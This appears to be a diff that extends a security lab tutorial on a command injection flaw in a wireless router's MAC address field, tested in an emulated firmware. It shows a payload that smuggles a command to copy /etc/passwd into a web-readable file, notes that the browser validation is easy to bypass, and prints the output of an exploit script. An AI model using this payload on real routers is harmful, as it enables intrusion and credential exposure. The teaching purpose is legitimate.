@@ -118,5 +118,40 @@ When the user enters a MAC address and clicks the submit button, the code above 
 wr_mfg_data -m f8ffc201fae5 -c 1
 ```
 
-You will notice that there is no validation of the input to this command by the code. It just checks that the first 12 characters of the MAC address are alphanumeric. This means we can add data to the end of a valid MAC address and it will accept it. So if  we add a 
+You will notice that there is no validation of the input to this command by the code. It just checks that the first 12 characters of the MAC address are alphanumeric. This means we can add data to the end of a valid MAC address and it will accept it. So if  we add a second command to the address, it will be executed as well. To do that, we use the command separator ; as follows:
+
+```bash
+wr_mfg_data -m f8ffc201fae5;cp /etc/passwd test.html; -c 1
+```
+
+To achieve this we would put "f8ffc201fae5;cp /etc/passwd test.html;" into the text box for the MAC address. The second command copies the password file to an HTML file test.html that we can then access from the website.
+
+For this to work, we need to bypass a JavaScript validation check in the browser of the MAC address but that is trivial to do. 
+
+### Testing the Vulnerability
+
+Short of going out and buying a wireless router to test this on, we can run the firmware in an emulator. There is an open source toolset that allows you to do that called Firmadyne. It is beyond the scope of this lab to set that up and get it running however, there is a version that I have set up on a Cloud VM that you can access with an exploit script. To run this, you can type:
+
+```bash
+root@c3e1d7ac5055:/opt/samples/WNAP320# ./exploit.py /etc/passwd
+root:x:0:0:root:/root:/bin/sh
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:100:sync:/bin:/bin/sync
+mail:x:8:8:mail:/var/spool/mail:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+operator:x:37:37:Operator:/var:/bin/sh
+haldaemon:x:68:68:hald:/:/bin/sh
+dbus:x:81:81:dbus:/var/run/dbus:/bin/sh
+nobody:x:99:99:nobody:/home:/bin/sh
+sshd:x:103:99:Operator:/var:/bin/sh
+admin:x:0:0:Default non-root user:/home/cli/menu:/usr/sbin/cli
+```
+
+If you are interested, you can look at the code in the Python script exploit.py. It takes one argument, the file on the router you want to look at. Of course, the script could be changed to insert a backdoor into the router and then gain access to the network that the router is connected to. 
+
+
 
